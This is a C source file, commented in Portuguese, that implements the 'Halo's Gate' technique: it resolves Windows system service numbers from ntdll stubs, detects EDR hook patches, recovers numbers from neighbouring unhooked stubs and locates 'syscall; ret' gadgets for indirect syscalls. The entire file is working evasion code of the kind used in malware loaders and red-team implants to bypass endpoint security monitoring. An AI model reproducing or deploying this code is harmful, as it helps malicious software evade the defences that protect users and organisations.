#include "helper.h"

DWORD ExtractSSN(
    _In_ PBYTE stubAddr, 
    _Out_ BOOL* isHooked) {

    *isHooked = FALSE;

    if (!stubAddr) return 0;

    // Verifica se está com um clean stub
    if (stubAddr[0] == PATTERN_MOV_R10_RCX_0 &&
        stubAddr[1] == PATTERN_MOV_R10_RCX_1 &&
        stubAddr[2] == PATTERN_MOV_R10_RCX_2)
    {
        if (stubAddr[3] == PATTERN_MOV_EAX_IMM32) {
            DWORD ssn = *(DWORD*)(stubAddr + 4);
            return ssn;
        }
    }

    // Verifica padrões de hooks
    if (stubAddr[0] == PATTERN_JMP_REL32) {
        *isHooked = TRUE;
        return 0;
    }

    if (stubAddr[0] == PATTERN_JMP_QWORD && stubAddr[1] == 0x25) {
        *isHooked = TRUE;
        return 0;
    }

    if (stubAddr[0] == PATTERN_MOV_R10_RCX_0 &&
        stubAddr[1] == PATTERN_MOV_R10_RCX_1 &&
        stubAddr[2] == PATTERN_MOV_R10_RCX_2 &&
        stubAddr[3] == PATTERN_JMP_REL32)
    {
        *isHooked = TRUE;
        return 0;
    }

    return 0;
}

// resolve SSN pelo vizinho
BOOL ResolveSSNFromNeighbor(
    _In_ PBYTE stubAddr, 
    _Out_ DWORD* outSSN) {

    const int STUB_SIZE = 0x20; 
    const int MAX_SEARCH = 25;

    for (int i = 1; i <= MAX_SEARCH; i++) {
        PBYTE neighbor = stubAddr - (i * STUB_SIZE);

        if (neighbor[0] == PATTERN_MOV_R10_RCX_0 &&
            neighbor[1] == PATTERN_MOV_R10_RCX_1 &&
            neighbor[2] == PATTERN_MOV_R10_RCX_2 &&
            neighbor[3] == PATTERN_MOV_EAX_IMM32)
        {
            DWORD neighborSSN = *(DWORD*)(neighbor + 4);
            *outSSN = neighborSSN + i;
            return TRUE;
        }
    }

    for (int i = 1; i <= MAX_SEARCH; i++) {
        PBYTE neighbor = stubAddr + (i * STUB_SIZE);

        if (neighbor[0] == PATTERN_MOV_R10_RCX_0 &&
            neighbor[1] == PATTERN_MOV_R10_RCX_1 &&
            neighbor[2] == PATTERN_MOV_R10_RCX_2 &&
            neighbor[3] == PATTERN_MOV_EAX_IMM32)
        {
            DWORD neighborSSN = *(DWORD*)(neighbor + 4);
            if (neighborSSN >= (DWORD)i) {
                *outSSN = neighborSSN - i;
                return TRUE;
            }
        }
    }

    return FALSE;
}

PVOID FindSyscallGadget(_In_ PBYTE stubAddr) {
    if (!stubAddr) return NULL;

    for (int i = 0; i < 64; i++) {
        // Procura por: 0F 05 C3 (syscall; ret)
        if (stubAddr[i] == PATTERN_SYSCALL_0 &&
            stubAddr[i + 1] == PATTERN_SYSCALL_1 &&
            stubAddr[i + 2] == PATTERN_RET)
        {
            return (PVOID)&stubAddr[i];
        }
    }

    return NULL;
}

// Função para resolver todas as syscalls
BOOL ResolveAllSyscalls(const char* funcName, SYSCALL_ENTRY* Syscall) {

    PBYTE hNtdll = GetNtdllBase();
    if (!hNtdll) printf("[!] Falha ao pegar a Ntdll\n");

    PBYTE stubAddr = (PBYTE)GetProcAddressPeb(hNtdll, funcName);
    if (!stubAddr) printf("[!] Falha ao pegar a função da Ntdll\n");

    BOOL isHooked = FALSE;
    DWORD ssn = ExtractSSN(stubAddr, &isHooked);

    Syscall->IsHooked = isHooked;

    if (!isHooked && ssn == 0 && stubAddr[3] != PATTERN_MOV_EAX_IMM32) {
        printf("[!] '%s' -- Não reconheci o stub .\n", funcName);
        return FALSE;
    }

    if (isHooked) {
        // Hookado ? Bora para o halos gate
        printf("[*] '%s' está HOOKADD. Tentando recuperar via Halos Gate...\n", funcName);
        if (!ResolveSSNFromNeighbor(stubAddr, &ssn)) {
            printf("[!] '%s' -- Halo's Gate falhou. Não foi possível recuperar o SSN\n", funcName);
            return FALSE;
        }
        printf("[+] '%s' SSN recuperado via neighbor: 0x%04X\n", funcName, ssn);
    }

    Syscall->SSN = ssn;

    PVOID gadget = FindSyscallGadget(stubAddr);

    if (!gadget && isHooked) {
        /* Caso a gadget tenha sido destruído pelo hook, vamo pegar via
        vizinho esses gadgets. Vamo que vamo */
        const int STUB_SIZE = 0x20;
        for (int i = 1; i <= 10; i++) {
            gadget = FindSyscallGadget(stubAddr + (i * STUB_SIZE));
            if (gadget) break;
            gadget = FindSyscallGadget(stubAddr - (i * STUB_SIZE));
            if (gadget) break;
        }
    }

    if (!gadget) {
        printf("  [!] '%s' -- não foi possível achar `syscall;ret` gadget.\n", funcName);
        return FALSE;
    }

    Syscall->Gadget = gadget;

    return TRUE;
}

BOOL InitializeSycallTable(void) {
    BOOL allResolved = TRUE;
    for (int i = 0; i < SYSCALL_COUNT; i++) {
        if (ResolveAllSyscalls(Syscalls[i].Name, &Syscalls[i])) {
            printf("[+] SSN: 0x%04X | Gadget: 0x%p | FuncName: %s%s\n",
                Syscalls[i].SSN,
                Syscalls[i].Gadget,
                Syscalls[i].Name,
                Syscalls[i].IsHooked ? " [HOOKED]" : " [CLEAN]");
        } else {
            printf("[!] FALHA ao resolver '%s'.\n", Syscalls[i].Name);
            allResolved = FALSE;
        }
    }

	return allResolved;
}

DWORD GetSSNFromSyscallTable(const char* Name) {
    for (int i = 0; i < SYSCALL_COUNT; i++)
    {
        if (strcmp(Syscalls[i].Name, Name) == 0)
            return Syscalls[i].SSN;
    }

    return 0;
}

PVOID GetGadgetFromSyscallTable(const char* Name) {
    for (int i = 0; i < SYSCALL_COUNT; i++)
    {
        if (strcmp(Syscalls[i].Name, Name) == 0)
            return Syscalls[i].Gadget;
    }

    return 0;
}